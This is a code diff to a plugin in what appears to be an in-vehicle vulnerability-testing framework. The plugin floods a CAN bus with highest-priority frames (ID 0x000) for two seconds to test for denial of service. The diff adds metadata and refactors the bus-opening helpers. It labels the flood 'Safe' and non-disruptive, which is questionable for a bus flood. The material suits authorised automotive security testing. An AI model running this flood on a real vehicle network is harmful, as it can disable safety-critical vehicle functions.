@@ -12,22 +12,29 @@ Usage: python3 24_CAN_DoS_Flood.py PCAN_USBBUS1
 import sys
 import time
 from iv_plugin_base import IVIVulnerabilityPlugin
+from can_bus_utils import format_can_settings, get_can_settings, open_can_bus
 
 class CANDoSFloodPlugin(IVIVulnerabilityPlugin):
+    meta_poc_name = "CAN DoS Flood"
+    meta_cve_id = "N/A"
+    meta_severity = "Medium"
+    meta_protocol = "can"
+    meta_target_os = ["all"]
+    meta_required_params = ["can_interface"]
+    is_disruptive = False
+    meta_destructive_level = "Safe"
+
     def check_prerequisites(self):
-        iface = self.params.get("can_interface", "PCAN_USBBUS1")
-        self.logger.info(f"使用CAN接口: {iface}")
+        settings = get_can_settings(self.params)
+        self.logger.info(f"使用CAN接口: {format_can_settings(settings)}")
         return True
 
     def exploit(self):
-        iface = self.params.get("can_interface", "PCAN_USBBUS1")
-        self.logger.info(f"CAN DoS测试 ({iface}), 发送2秒高优先级帧...")
+        settings = get_can_settings(self.params)
+        self.logger.info(f"CAN DoS测试 ({format_can_settings(settings)}), 发送2秒高优先级帧...")
         try:
             import can
-            if "PCAN" in iface:
-                bus = can.interface.Bus(channel=iface, interface="pcan", bitrate=500000)
-            else:
-                bus = can.interface.Bus(channel=iface, bustype="socketcan")
+            bus = open_can_bus(self.params)
             flood_msg = can.Message(
                 arbitration_id=0x000,  # Highest priority
                 data=[0xFF]*8, is_extended_id=False
@@ -57,5 +64,5 @@ if __name__ == "__main__":
     if len(sys.argv) < 2:
         print("Usage: python3 24_CAN_DoS_Flood.py <can_interface>")
         sys.exit(1)
-    plugin = CANDoSFloodPlugin({"target_ip": "N/A", "can_interface": iface})
+    plugin = CANDoSFloodPlugin({"target_ip": "N/A", "can_interface": sys.argv[1]})
     plugin.run_verify()
